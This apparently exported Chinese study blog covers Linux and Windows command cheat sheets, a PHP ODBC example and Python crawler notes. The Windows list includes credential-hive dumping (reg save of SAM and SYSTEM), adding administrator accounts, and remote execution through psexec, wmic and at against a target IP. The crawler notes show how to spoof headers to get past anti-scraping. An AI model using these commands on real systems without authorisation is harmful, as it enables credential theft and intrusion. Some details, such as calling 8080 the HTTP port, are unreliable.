mode下，才可以做文字输入，按「ESC」键可回到命令行模式。<br>3.底行模式（last line mode）<br>将文件保存或退出vi，也可以设置编辑环境，如寻找字符串、列出行号……等。</p><pre><code>**打开**vi filename :打开或新建文件，并将光标置于第一行首vi +n filename ：打开文件，并将光标置于第n行首vi + filename ：打开文件，并将光标置于最后一行首**编辑**i 在当前位置生前插入I 在当前行首插入a 在当前位置后插入A 在当前行尾插入o 在当前行之后插入一行O 在当前行之前插入一行编辑结束，按Esc返回命令模式**基本查找**/text　　查找text，按n健查找下一个，按N健查找前一个。?text　　查找text，反向查找，按n健查找下一个，按N健查找前一个。查找很长的词，如果一个词很长，键入麻烦，可以将光标移动到该词上，按*或#键即可以该单词进行搜索，相当于/搜索。而#命令相当于?搜索。**删除**删除当前行 dd删除2行 2dd**拷贝和粘贴**yy 拷贝当前行nyy 拷贝当前后开始的n行，比如2yy拷贝当前行及其下一行。p  在当前光标后粘贴区块拷贝1. 将光标移动到要复制的文本开始的地方，按 v进入可视模式。2. 将光标移动到要复制的文本的结束的地方，按y复制。此时vim会自动将光标定位到选中文本的开始的地方，并退出可视模式。3. 我移动光标到文本结束的地方，按 p粘贴。**退出命令**:wq 保存并退出:q! 强制退出并忽略所有更改:e! 放弃所有修改，并打开原来文件:w保存修改**显示行号**set numberset nu输入:n，代表跳转到第n行，如:100，就跳转到第100行。撤销操作u——&gt; vim与vi的区别——&gt; vim是vi的延申 vim编辑源码会高亮 vim的命令对vi是完全兼容的</code></pre><h3 id="5-文件搜索"><a href="#5-文件搜索" class="headerlink" title="5.文件搜索"></a>5.文件搜索</h3><pre><code>find / -name file1 从 ‘/’ 开始进入根文件系统搜索文件和目录find / -user user1 搜索属于用户 ‘user1’ 的文件和目录find /home/user1 -name *.bin 在目录 ‘/ home/user1’ 中搜索带有’.bin’ 结尾的文件find /usr/bin -type f -atime +100 搜索在过去100天内未被使用过的执行文件find /usr/bin -type f -mtime -10 搜索在10天内被创建或者修改过的文件find . -name &#39;*.php&#39; -mmin -30  查找最近30分钟修改的当前目录下的.php文件find . -name &#39;*.php&#39; -mtime 0  查找最近24小时修改的当前目录下的.php文件find . -name &#39;*.inc&#39; -mtime 0 -ls  查找最近24小时修改的当前目录下的.php文件，并列出详细信息find . -type f -mtime 1  查找当前目录下，最近24-48小时修改过的常规文件。find . -type f -mtime +1  查找当前目录下，最近1天前修改过的常规文件。-atime 文件访问时间-ctime 文件常见时间-mtime文件修改时间-mtime n : n为数字，意思为在n天之前的“一天之内”被更改过内容的文件-mtime +n : 列出在n天之前（不含n天本身）被更改过内容的文件名-mtime -n : 列出在n天之内（含n天本身）被更改过内容的文件名-type f 代表一个普通格式的文件 二进制文件-type d 代表文件夹find / -name *.rpm -exec chmod 755 ‘&#123;&#125;’ ; 搜索以 ‘.rpm’ 结尾的文件并定义其权限--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--文件中r w x -的含义:r是只读权限，w是写的权限，x是可执行权限,-是没有任何权限。目录中r w x的含义:r具有ls权限，w是在目录上可以增加、删除、创建权限，x是具有ls –l权限。权限     读    写   执行        读    写   执行      读   写   执行字符     r     w     x           r     w    x         r    w    x数字     4     2     1           4     2    1         4    2    1分配     对象文件所有者          文件所属组用户         其他用户chmod 777 +文件名 给单独文件赋所有权限chmod -R 777 /home/user  表示将整个/home/user目录与其中的文件和子目录的权限都设置为rwxrwxrwx常用权限-rw------- (600) 只有所有者才有读和写的权限-rw-r--r-- (644) 只有所有者才有读和写的权限，组群和其他人只有读的权限-rwx------ (700) 只有所有者才有读，写，执行的权限-rwxr-xr-x (755) 只有所有者才有读，写，执行的权限，组群和其他人只有读和执行的权限-rwx--x--x (711) 只有所有者才有读，写，执行的权限，组群和其他人只有执行的权限-rw-rw-rw- (666) 每个人都有读写的权限-rwxrwxrwx (777) 每个人都有读写和执行的权限也可以使用字母模式chmod +x 和chmod a+x 是一样的，一般没有明确要求，可以就用chmod +xu代表用户   g代表用户组   o代表其它   a代表所有创建一个文件只有用户具有完全控制的权限touch 文件名chmod u+rwx 文件名 当前用户加全部的权限chmod g-r 文件名   群组把读取权限去掉chmod o-r 文件名   其他用户读取权限去掉--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--+--find / -xdev -name *.rpm 搜索以 ‘.rpm’ 结尾的文件，忽略光驱、捷盘等可移动设备locate *.ps 寻找以 ‘.ps’ 结尾的文件 - 先运行 ‘updatedb’ 命令whereis halt 显示一个二进制文件、源码或man的位置which halt 显示一个二进制文件或可执行文件的完整路径grep kali /etc/passwd grep关键词搜索find / -name moonsec 2&gt;/dev/null   搜索某个文件/文件夹 屏蔽出错信息</code></pre><h3 id="6-用户和群组"><a href="#6-用户和群组" class="headerlink" title="6.用户和群组"></a>6.用户和群组</h3><pre><code>groupadd group_name 创建一个新用户组groupdel group_name 删除一个用户组cat /etc/group | grep group_name usermod -a -G moontea k1把用户k1附加其他用户组useradd moonsecpasswd moonsecuseradd -r -m -s /bin/bash moonsec参数的意思：-r 建立系统账号-m 自动建立用户的登入目录-s /bin/bash 指定用户登入后所使用的shellsu - root 切换到root用户su 用户名 切换到普通用户</code></pre><h3 id="7-系统管理"><a href="#7-系统管理" class="headerlink" title="7.系统管理"></a>7.系统管理</h3><pre><code>top  查看正在指向的程序信息ps -ef 查看所有进程信息ps -ef | grep tomcat 查找指定进程kill -9 id 强制杀死进程env 当前的变量查看系统变量echo $PATHhostname 查看主机名history 查看历史命令</code></pre><h3 id="8-查看磁盘信息"><a href="#8-查看磁盘信息" class="headerlink" title="8.查看磁盘信息"></a>8.查看磁盘信息</h3><pre><code>df   默认不带单位，挂载点、总容量、已用、可用df  -h   友好显示（带单位），很多命令的友好显示都是-h</code></pre><h3 id="9-查看内存信息"><a href="#9-查看内存信息" class="headerlink" title="9.查看内存信息"></a>9.查看内存信息</h3><pre><code>free   默认以KB为单位，总容量、已用、可用、缓存大小free  -m   默认以MB为单位free  -h   上面2种都不带单位、只显示数值，这种是友好显示的，会带单位G、M等</code></pre><h3 id="10-查看环境变量"><a href="#10-查看环境变量" class="headerlink" title="10.查看环境变量"></a>10.查看环境变量</h3><pre><code>echo  $JAVA_HOMEecho $PATH | grep jdk</code></pre><h3 id="11-开机自启"><a href="#11-开机自启" class="headerlink" title="11.开机自启"></a>11.开机自启</h3><p>有很多程序往往都需要设置开机自启，比如tomcat、mysql、nginx等。</p><pre><code>vim /etc/rc.d/rc.local   在/etc/rc.d/rc.local文件中加入开机要自动执行的程序mount -t smbfs -o username=user,password=pass //WinClient/share /mnt/share   挂载一个windows网络共享</code></pre><h3 id="12-网卡配置"><a href="#12-网卡配置" class="headerlink" title="12.网卡配置"></a>12.网卡配置</h3><pre><code>vi /etc/network/interfacesauto eth0                     //指定网卡（根据ifconfig结果修改）iface eth0 inet static        //启动静态ipaddress 192.168.0.66          // 设置静态ipnetmask 255.255.255.0         //子网掩码gateway 192.168.0.1           //指定网关service networking restart    //重启网络systemctl restart networking  //重启网络ifconfig eth0 192.168.0.33    //设置临时ip</code></pre><h3 id="13网卡DNS服务器"><a href="#13网卡DNS服务器" class="headerlink" title="13网卡DNS服务器"></a>13网卡DNS服务器</h3><pre><code>vi /etc/resovl.confnameserver 114.114.114.114重启网卡service networking restartsystemctl restart networking注意有时候重启才生效</code></pre><h3 id="14-服务相关"><a href="#14-服务相关" class="headerlink" title="14.服务相关"></a>14.服务相关</h3><pre><code>apache2服务器打开：/etc/init.d/apache2 start 重启：/etc/init.d/apache2 restart关闭：/etc/init.d/apache2 stop/etc/init.d/network start  启动网卡echo 1 &gt; /proc/sys/net/ipv4/ip_forward  开启路由转发</code></pre><h3 id="15-linux常用网络命令"><a href="#15-linux常用网络命令" class="headerlink" title="15.linux常用网络命令"></a>15.linux常用网络命令</h3><p>网络和监控命令类似于这些： hostname, ping, ifconfig, iwconfig, netstat, nslookup, traceroute, finger, telnet, ethtool<br>用于查看 linux 服务器 ip 地址，管理服务器网络配置，通过 telnet 和 ethernet 建立与 linux 之间的网络链接，查看 linux 的服务器信息等。</p><pre><code>hostname 查看本机名ping  一般用于测试网络是否通 内网icmpping www.baidu.com -c 3 执行3次ifconfig 网卡信息iwconfig 用于配置或获取无线网络设备信息netstat -a (all)显示所有选项，默认不显示LISTEN相关-t (tcp)仅显示tcp相关选项-u (udp)仅显示udp相关选项-n 拒绝显示别名，能显示数字的全部转化成数字。-l 仅列出有在 Listen (监听) 的服務状态-p 显示建立相关链接的程序名-r 显示路由信息，路由表-e 显示扩展信息，例如uid等-s 按各个协议进行统计-c 每隔一个固定时间，执行该netstat命令。提示：LISTEN和LISTENING的状态只有用-a或者-l才能看到netstat -ano-an 查看当前所有已连接端口-nlpt 查看当前所有tcp端口-nlpu 查看当前所有udp端口-nlpt | grep 80 查看所有80端口使用情况netstat -lntup 查看所有的tcp和upd端口nslookup 查询其他记录直接查询返回的是A记录，我们可以指定参数，查询其他记录，比如AAAA、MX等。nslookup -qt=type domain [dns-server]其中，type可以是以下这些类型：A 地址记录AAAA 地址记录AFSDB Andrew文件系统数据库服务器记录ATMA ATM地址记录CNAME 别名记录HINFO 硬件配置记录，包括CPU、操作系统信息ISDN 域名对应的ISDN号码MB 存放指定邮箱的服务器MG 邮件组记录MINFO 邮件组和邮箱的信息记录MR 改名的邮箱记录MX 邮件服务器记录NS 名字服务器记录PTR 反向记录RP 负责人记录RT 路由穿透记录SRV TCP服务器信息记录TXT 域名对应的文本信息X25 域名对应的X.25地址记录traceroute-d 使用Socket层级的排错功能。-f 设置第一个检测数据包的存活数值TTL的大小。-F 设置勿离断位。-g 设置来源路由网关，最多可设置8个。-i 使用指定的网络界面送出数据包。-I 使用ICMP回应取代UDP资料信息。-m 设置检测数据包的最大存活数值TTL的大小。-n 直接使用IP地址而非主机名称。-p 设置UDP传输协议的通信端口。-r 忽略普通的Routing Table，直接将数据包送到远端主机上。-s 设置本地主机送出数据包的IP地址。-t 设置检测数据包的TOS数值。-v 详细显示指令的执行过程。-w 设置等待远端主机回报的时间。-x 开启或关闭数据包的正确性检验。(traceroute是用来检测发出数据包的主机到目标主机之间所经过的网关数量的工具。)(traceroute的原理是试图以最小的TTL（存活时间）发出探测包来跟踪数据包到达目标主机所经过的网关，然后监听一个来自网关ICMP的应答。发送数据包的大小默认为38个字节。)telnetLinux telnet命令用于远端登入。执行telnet指令开启终端机阶段作业，并登入远端主机。现在多数用于检测某个端口是否开放FingerFinger是一种用户信息分享服务。它工作在TCP 79端口，可以用来公开用户的特定信息。Nmap的finger的脚本可以向Finger服务器发送请求，查询并获取用户的相关信息，如登录名、用户名、TTY类型、登录时间等。ethtool 是用于查询及设置网卡参数的命令</code></pre><h3 id="16-防火墙iptables"><a href="#16-防火墙iptables" class="headerlink" title="16.防火墙iptables"></a>16.防火墙iptables</h3><pre><code>iptalbes -L  查看防火墙规则iptables -F   清除规则/etc/init.d/iptables stop   关闭防火墙service iptables stop安装：apt-get install ufw关闭：ufw disable # To disable the firewall开启：ufw enable # To enable the firewall</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows常用命令</title>
      <link href="/2022/11/20/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/"/>
      <url>/2022/11/20/Windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/</url>
      
        <content type="html"><![CDATA[<h3 id="Windows常用命令"><a href="#Windows常用命令" class="headerlink" title="Windows常用命令"></a>Windows常用命令</h3><pre><code>ifconfig /all 获取获取域名、IP地址、DHCP服务器、网关、MAC地址、主机名net time /domain 查看域名、时间net view /domain 查看域内所有共享net view ip 查看对方局域网内开启了哪些共享net config workstation 查看域名、机器名等net user 用户名 密码 /add 建立用户net user 用户名 /del #删除用户net user guest /active:yes 激活guest账户net user 查看账户net user 账户名 查看指定账户信息net user /domain 查看域内有哪些用户，Windows NT Workstation 计算机上可用，由此可以此判断用户是否是域成员。net user 用户名 /domain 查看账户信息net group /domain 查看域中的组net group &quot;domain admins&quot; /domain 查看当前域的管理用户query user 查看当前在线的用户net localgroup 查看所有的本地组net localgroup administrators 查看administrators组中有哪些用户net localgroup administrators 用户名 /add 把用户添加到管理员组中net start 查看开启服务net start 服务名 开启某服务net stop 服务名 停止某服务net share 查看本地开启的共享net share ipc$ 开启ipc$共享net share ipc$ /del 删除ipc$共享net share c$ /del 删除C：共享\\192.168.0.108\c 访问默认共享c盘dsquery server 查看所有域控制器dsquery subnet 查看域内内子网dsquery group 查看域内工作组dsquery site 查看域内站点netstat -a 查看开启了哪些端口,常用netstat -annetstat -n 查看端口的网络连接情况，常用netstat -annetstat -v 查看正在进行的工作netstat -p 协议名 例：netstat -p tcq/ip 查看某协议使用情况（查看tcp/ip协议使用情况）netstat -s 查看正在使用的所有协议使用情况nbtstat -A ip 对方136到139其中一个端口开了的话，就可查看对方最近登陆的用户名（03前的为用户名）-注意：参数-A要大写reg save hklm\sam sam.hive 导出用户组信息、权限配置reg save hklm\system system.hive 导出SYSKEYnet use \\目标IP\ipc$ 密码 /u:用户名 连接目标机器at \\目标IP 21:31 c:\server.exe 在某个时间启动某个应用wmic /node:&quot;目标IP&quot; /password:&quot;123456&quot; /user:&quot;admin&quot; 连接目标机器psexec.exe \\目标IP -u username -p password -s cmd 在目标机器上执行cmdfinger username @host 查看最近有哪些用户登陆route print 显示出IP路由，将主要显示网络地址Network addres，子网掩码Netmask，网关地址Gateway addres，接口地址Interfacearp 查看和处理ARP缓存，ARP是名字解析的意思，负责把一个IP解析成一个物理性的MAC地址。arp -a 将显示出全部信息nslookup IP地址侦测器tasklist 查看当前进程taskkill /pid PID数 终止指定PID进程whoami 查看当前用户及权限systeminfo 查看计算机信息（版本，位数，补丁情况）ver 查看计算机操作系统版本tasklist /svc 查看当前计算机进程情况netstat -ano 查看当前计算机进程情况wmic product &gt; ins.txt 查看安装软件以及版本路径等信息，重定向到ins.txt</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ODBC数据库</title>
      <link href="/2022/11/19/ODBC%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2022/11/19/ODBC%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h5 id="此章节是拓展阅读，选择性食用"><a href="#此章节是拓展阅读，选择性食用" class="headerlink" title="此章节是拓展阅读，选择性食用"></a>此章节是拓展阅读，选择性食用</h5><p>概念:ODBC 是一种应用程序编程接口(API)，使我们有能力连接到某个数据源。</p><h4 id="创建-ODBC-连接"><a href="#创建-ODBC-连接" class="headerlink" title="创建 ODBC 连接"></a>创建 ODBC 连接</h4><p>通过一个 ODBC 连接，可以连接到网络中的任何计算机上的任何数据库。<br>创建到达 MS Access 数据库的 ODBC 连接的方法:<br>1.在控制面板中打开管理工具图标。<br>2.双击其中的数据源(ODBC)图标。<br>3.选择系统 DSN 选项卡。<br>4.点击系统 DSN 选项卡中的添加。<br>5.选择Microsoft Access Driver。点击完成。<br>6.在下一个界面，点击选择来定位数据库。<br>7.为数据库起一个数据源名(DSN)。<br>8.点击确定。</p><p>注意:必须在您的网站所在的计算机上完成这个配置。<br>如果您的计算机上正在运行 Internet 信息服务(IIS)，上面的指令将会生效。<br>但是如果您的网站位于远程服务器，您必须拥有对该服务器的物理访问权限，或者请您的主机提供商为您建立 DSN。</p><h4 id="连接-ODBC"><a href="#连接-ODBC" class="headerlink" title="连接 ODBC"></a>连接 ODBC</h4><pre><code>实例下面的实例创建了到达名为 link 的 DSN 的连接，没有用户名和密码。然后创建并执行一条 SQL 语句：$conn=odbc_connect(&#39;link&#39;,&#39;&#39;,&#39;&#39;);           //数据源名、用户名、密码以及可选的指针类型$sql=&quot;SELECT * FROM customers&quot;;$rs=odbc_exec($conn,$sql);                  //执行 SQL 语句</code></pre><h4 id="取回记录"><a href="#取回记录" class="headerlink" title="取回记录"></a>取回记录</h4><p>从结果集中返回记录。如果能够返回行，则函数返回 true，否则返回 false。</p><pre><code>该函数有两个参数：ODBC 结果标识符和可选的行号:odbc_fetch_row ( resource $result_id [, int $row_number = 1 ] )</code></pre><h4 id="从记录中取回字段"><a href="#从记录中取回字段" class="headerlink" title="从记录中取回字段"></a>从记录中取回字段</h4><p>从记录中读取字段。该函数有两个参数:ODBC 结果标识符和字段编号或名称。</p><pre><code>$compname=odbc_result($rs,1);                             //从记录中返回第一个字段的值$compname=odbc_result($rs,&quot;CompanyName&quot;);                 //返回名为 &quot;CompanyName&quot; 的字段的值</code></pre><h4 id="关闭-ODBC-连接"><a href="#关闭-ODBC-连接" class="headerlink" title="关闭 ODBC 连接"></a>关闭 ODBC 连接</h4><p> odbc_close($conn); </p><h4 id="全过程示例"><a href="#全过程示例" class="headerlink" title="全过程示例"></a>全过程示例</h4><pre><code> &lt;?php $conn=odbc_connect(&#39;northwind&#39;,&#39;&#39;,&#39;&#39;);            //连接 ODBC if (!$conn)                                       //验证链接 &#123;exit(&quot;Connection Failed: &quot; . $conn);&#125;            //失败的回显 $sql=&quot;SELECT * FROM customers&quot;;                   //创建链接 $rs=odbc_exec($conn,$sql);                        //执行 SQL 语句 if (!$rs) &#123;exit(&quot;Error in SQL&quot;);&#125;                           //判断是否连接正常 echo &quot;&lt;table&gt;&lt;tr&gt;&quot;; echo &quot;&lt;th&gt;Companyname&lt;/th&gt;&quot;;                      //回显 echo &quot;&lt;th&gt;Contactname&lt;/th&gt;&lt;/tr&gt;&quot;; while (odbc_fetch_row($rs))                       //取回记录 &#123; $compname=odbc_result($rs,&quot;CompanyName&quot;);         //从记录中取回字段compname $conname=odbc_result($rs,&quot;ContactName&quot;);          //从记录中取回字段compname echo &quot;&lt;tr&gt;&lt;td&gt;$compname&lt;/td&gt;&quot;;  echo &quot;&lt;td&gt;$conname&lt;/td&gt;&lt;/tr&gt;&quot;; &#125; odbc_close($conn);                                //关闭 ODBC 连接 echo &quot;&lt;/table&gt;&quot;; ?&gt;</code></pre>]]></content>
      
      
      <categories>
          
          <category> 附录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 附录 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221119</title>
      <link href="/2022/11/19/20221119/"/>
      <url>/2022/11/19/20221119/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="基于面向对象的Python爬虫"><a href="#基于面向对象的Python爬虫" class="headerlink" title="基于面向对象的Python爬虫"></a>基于面向对象的Python爬虫</h4><pre><code>import urllib.requestimport reclass GetHtml(object):    def __init__(self,URL,HEAD):      //初始化        self.url=URL        self.head=HEAD        def get_index(self):              //获取主页信息        self.request=urllib.request.Request(self.url)        self.request.add_header(&#39;user-agent&#39;,self.request)        self.response=urllib.request.urlopen(self.request)        return self.response.read()        def get_list(self):               //获取符合条件的列表        self.strimglist=[]        self.imglist=re.findall(b&#39;匹配条件&#39;,self.get_index())        for i in self.imglist:            self.strimglist.append(self.url+str(i,encoding=&#39;utf8&#39;))        return self.strimglist        def get_image(self):              //下载资源        num=0        for self.url in self.get_list():            num+=1            with open(str(num)+&#39;后缀&#39;,&#39;wb&#39;) as file:                file.write(self.get_index())html=GetHtml(&#39;目标地址&#39;,&#39;请求头&#39;)html.get_list()</code></pre><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。"><a href="#有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。" class="headerlink" title="有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。"></a>有阳光、还感觉冷。如果我忍住这个秘密、温暖冬天就会遥遥而无期。</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221118</title>
      <link href="/2022/11/18/20221118/"/>
      <url>/2022/11/18/20221118/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="面向对象编程"><a href="#面向对象编程" class="headerlink" title="面向对象编程"></a>面向对象编程</h4><p>类:设计<br>对象:实例</p><h4 id="类的命名"><a href="#类的命名" class="headerlink" title="类的命名"></a>类的命名</h4><p>驼峰命名法</p><h4 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h4><pre><code>class 类名:    属性(变量) = 值    def 函数名(self):         //方法(函数),一定要写self        执行代码对象名=类名()                 //创建对象对象名.函数()                 //调用对象</code></pre><h4 id="魔法方法"><a href="#魔法方法" class="headerlink" title="魔法方法"></a>魔法方法</h4><p>通常格式为__方法名__</p><pre><code>def __init__(self,值):    self.属性=值如果值也是一个变量就能随时传参进行更改</code></pre><h4 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h4><p>1.定义类class<br>2.创建内存空间,定义属性和方法<br>3.实例化类,创建对象<br>4.调用类的方法</p><h3 id="每日一句"><a href="#每日一句" class="headerlink" title="每日一句"></a>每日一句</h3><h5 id="风吹落最后一片叶，"><a href="#风吹落最后一片叶，" class="headerlink" title="风吹落最后一片叶，"></a>风吹落最后一片叶，</h5><h5 id="我的心也飘着雪，"><a href="#我的心也飘着雪，" class="headerlink" title="我的心也飘着雪，"></a>我的心也飘着雪，</h5><h5 id="爱只能往回忆里堆叠。"><a href="#爱只能往回忆里堆叠。" class="headerlink" title="爱只能往回忆里堆叠。"></a>爱只能往回忆里堆叠。</h5>]]></content>
      
      
      
        <tags>
            
            <tag> 日报 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20221117</title>
      <link href="/2022/11/17/20221117/"/>
      <url>/2022/11/17/20221117/</url>
      
        <content type="html"><![CDATA[<h3 id="每日一记"><a href="#每日一记" class="headerlink" title="每日一记"></a>每日一记</h3><h4 id="Python爬虫思路"><a href="#Python爬虫思路" class="headerlink" title="Python爬虫思路"></a>Python爬虫思路</h4><p>1.发送请求获取网站html代码<br>2.过滤有效信息<br>3.解析数据<br>4.处理数据</p><h4 id="爬取过程"><a href="#爬取过程" class="headerlink" title="爬取过程"></a>爬取过程</h4><p>1.找到网站发起请求<br>2.分析url并提取<br>3.分析url并解释网络内容<br>4.存储数据并获取新url<br>5.判断是否满足停止条件0</p><h4 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h4><p>决定可以访问的user(允许爬取的user)</p><h4 id="http与https"><a href="#http与https" class="headerlink" title="http与https"></a>http与https</h4><p>http端口是8080<br>https加密,SSL层,端口是443</p><h4 id="URL与URI"><a href="#URL与URI" class="headerlink" title="URL与URI"></a>URL与URI</h4><p>url包括协议类型，主机名/域名，端口号，查找路径，查找参数，锚点<br>uri是utl请求之前部分</p><h4 id="请求方式"><a href="#请求方式" class="headerlink" title="请求方式"></a>请求方式</h4><p>get不影响资源/post影响资源</p><h4 id="请求头参数"><a href="#请求头参数" class="headerlink" title="请求头参数"></a>请求头参数</h4><p>user-agent:浏览器名称<br>referer:请求源头<br>cookie:用于判断用户身份</p><h4 id="常见响应状态码"><a href="#常见响应状态码" class="headerlink" title="常见响应状态码"></a>常见响应状态码</h4><p>200:正常返回<br>301:永久重定向<br>404:url错误<br>418:反爬虫，解决响应<br>500:服务器错误，bug</p><h4 id="请求交互过程"><a href="#请求交互过程" class="headerlink" title="请求交互过程"></a>请求交互过程</h4><p>1.客户端浏览器向服务器发送请求<br>2.网站接收请求处理后返回响应数据<br>3.浏览器解析源码</p><h4 id="开发者工具"><a href="#开发者工具" class="headerlink" title="开发者工具"></a>开发者工具</h4><p>element:分析网页结构，获取数据<br>console:打印输出网站信息<br>network:查看网络请求<br>source:所有的源文件(只能查看静态数据)</p><h4 id="Session与Cookie原理"><a href="#Session与Cookie原理" class="headerlink" title="Session与Cookie原理"></a>Session与Cookie原理</h4><p>【Session】<br>特点:可长时间保存会话<br>过程:<br>1.客户端第一次发送请求时服务器端创建Session对象(生成sessionID)<br>2.将sessionID存入cookie传回<br>3.下次发送请求时包含sessionID<br>【Cookie】<br>特点:从服务器发送给浏览器后一直保存到关闭浏览器<br>过程:<br>1.创建cookie<br>2.设置存储cookie<br>3.发送cookie<br>4.读取cookie</p><h4 id="JSON-数据交换语言"><a href="#JSON-数据交换语言" class="headerlink" title="JSON(数据交换语言)"></a>JSON(数据交换语言)</h4><p>JavaScript ObjectNotation，JS对象标记<br>数据格式:<br>1.对象表示为键值对<br>2.数据用逗号分隔<br>3.花括号保存对象<br>4.方括号保存数组<br>整体上与python的字典相似<br>例:</p><pre><code>json_yuju=&#123;&#39;name&#39;:&#39;python&#39;,&#39;address&#39;:&#123;&#39;province&#39;:&#39;guangdong&#39;,&#39;city&#39;:[&#39;guangzhou&#39;,&#39;huizhou&#39;]&#125;&#125;print(json_yuju[&#39;address&#39;][&#39;city&#39;][2])               //输出huizhou</code></pre><h4 id="Ajax-Web数据交互方式"><a href="#Ajax-Web数据交互方式" class="headerlink" title="Ajax(Web数据交互方式)"></a>Ajax(Web数据交互方式)</h4><p>Ajax在服务器与浏览器之间使用异步数据传输(可以只请求少量信息)<br>Ajax技术独立于浏览器与平台<br>Ajax一般返回JSON(对Ajax地址进行post或get就可以返回JSON数据)<br>Ajax渲染到html的叫做动态数据<br>服务器后台生成的是静态数据<br>html中的在source中没有找到那就是ajax<br>注意:Ajax需要用户允许JavaScript在浏览器上执行</p><h4 id="urllib"><a href="#urllib" class="headerlink" title="urllib"></a>urllib</h4><p>py自带的网络请求库<br>模块:<br>urllib.request打开并读取url</p><pre><code>模拟浏览器发送请求并获取响应结果data默认为None即Get请求，post请求时要将data以字典形式存储，由字典类型转换成字节类型转换成的数据类型看网页源代码【GET】import urllib.requesturl=&#39;https......&#39;                           //传入urlresponse=urllib.request.urlopen(url)        //发送get请求html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【POST】import urllib.requesturl=&#39;https......&#39;                           //传入urldata=&#123;&#39;a&#39;:&#39;A&#39;,&#39;b&#39;:&#39;B&#39;,&#39;action&#39;:&#39;login&#39;&#125;     //从Form Data处查看response=urllib.request.urlopen(url,data=bytes(urllib.prase.urlencode(data),encoding=&#39;utf-8&#39;))html=response.read().decode(&#39;gbk&#39;)          //读取响应并将数据类型转为strprint(html)【通过伪造请求头绕过418】import urllib.requesturl=&#39;https......&#39;                           //传入urlheader=&#123;&#39;User-Agent&#39;:&#39;浏览器信息&#39;&#125;request=urllib.request.Request(url,headers=header)response=urllib.request.urlopen(request)html=response.read().decode(&#39;utf-8&#39;)        //读取响应并将数据类型转为strprint(html)</code></pre><p>urllib.error包含提出的异常urllib.request</p><pre><code>import urllib.requestimport urllib.errorurl=&#39;目标地址&#39;try:    response=urllib.request.urlopen(url)    //尝试链接expect urllib.error.URLError as e:          //捕获返回信息    print(e.reason)</code></pre><p>urllib.parse解析url</p><pre><code>import urllib.parsea=&#123;&#39;A&#39;:&#39;内容&#39;&#125;                              //创建键值对result1=urllib.parse.urlencode(a)           //url编码result2=urllib.prase.unquote(result1)       //url解码属性:code:请求返回的状态码reason:返回错误的原因headers:请求返回的响应头信息</code></pre><p>urllib.robotparase解析robots.txt文件</p><h4 id="IP代理"><a href="#IP代理" class="headerlink" title="IP代理"></a>IP代理</h4><p>网站会拒绝同一IP多次访问<br>命令行中输入ipconfig的IPv4是本地IP<br>分类:<br>1.透明代理，知道使用了且知道源IP<br>2.匿名代理，知道使用了但是不知道源IP<br>3.高匿代理，都不知道<br><a href="https://www.xicidaili.com/nn/">免费网站</a><br>语法:</p><pre><code>from urllib.request import build_openerfrom urllib.request import ProxyHandlerproxy=ProxyHandler(&#123;&#39;协议类型http/https&#39;:&#39;IP地址:端口&#39;&#125;)opener=build_opener(proxy)url=&#39;目标地址&#39;response=opener.open(url)print(response.read().decode(&#39;utf-8&#39;))</code></pre><h4 id="使用Cookie"><a href="#使用Cookie" class="headerlink" title="使用Cookie"></a>使用Cookie</h4><p>使用步骤:<br>1.实例化MozillaCookieJar(保存cookie)<br>2.创建handler对象(cookie的处理器)<br>3.创建opener对象<br>4.打开网页发送请求获取响应<br>5.保存cookie文件<br>语法:</p><pre><code>import urllib.requestfrom http import cookiejarfilename=&#39;cookie.txt&#39;def get_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar(filename)           //实例化MCJ    handler=urllib.request.HTTPCookieProcessor(cookie)    //创建handler对象    opener=urllib.request.build_opener(handler)           //创建opener对象    url=&#39;目标地址&#39;    response=opener.open(url)                             //发送请求并获取响应    cookie.save()                                         //保存cookie文件def use_cookie():                                         //定义获取cookie函数    cookie=cookiejar.MozillaCookieJar()                   //实例化MCJ    cookie.load(filename)                                 //加载cookie文件    print(cookie)if __name__ = &#39;__main__&#39;:    use_cookie()                                          //读取cookie</code></pre><h4 id="requests库-包括上面的功能"><a href="#requests库-包括上面的功能" class="headerlink" title="requests库(包括上面的功能)"></a>requests库(包括上面的功能)</h4><pre><code>常用方法:requestsrequests.request(url)            //构造请求requests.get(url,params=None)    //Get请求。params可省略,params是请求的参数requests.post(url,data=None,json=None)requests.head()                  //获取html头部信息requests.put()                   //发送Put请求requests.patch()                 //提交局部修改的请求requests.delete()                //提交删除请求params是请求参数常用属性:response.status_code             //响应状态码response.content                 //response对象转为二进制数据response.text                    //response对象转为字符串数据response.encoding                //定义response对象编码response.cookies()               //获取请求后的cookieresponse.session()               //获取请求后的sessionresponse.url       